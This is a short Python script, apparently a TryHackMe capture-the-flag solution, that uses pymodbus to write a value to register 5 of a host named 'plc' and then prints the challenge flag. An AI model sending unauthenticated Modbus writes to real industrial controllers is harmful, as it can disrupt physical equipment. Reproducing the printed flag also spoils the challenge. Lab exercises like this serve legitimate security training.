#!/usr/bin/env python3
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("plc", port=502)
client.connect()

# Restore Christmas - Write 1 to register 40005
result = client.write_register(5, 1)
if result.isError():
    print("[-] Failed to restore Christmas!")
else:
    print("[+] Christmas restored successfully!")
    print("THM{eGgMas0V3r}")

client.close()
